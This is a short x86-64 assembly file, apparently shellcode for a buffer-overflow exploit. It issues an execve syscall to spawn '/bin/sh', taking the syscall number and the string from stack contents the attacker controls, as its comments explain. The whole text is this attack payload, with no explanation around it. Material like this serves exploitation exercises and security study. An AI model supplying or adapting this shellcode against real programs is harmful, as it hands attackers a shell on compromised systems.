; execve(["/bin/sh",], [], [])

bits 64
	;mov rax, 0x3b
    ; we should put this value onto the stack too
	pop rax
	pop rbx ; pop some junk value

    ;push 0x68
    ;mov rax, 0x732f2f6e69622f2f
    ;push rax
    ; we should put the /bin/sh string onto the stack using the buffer overflow
	mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx	
	syscall
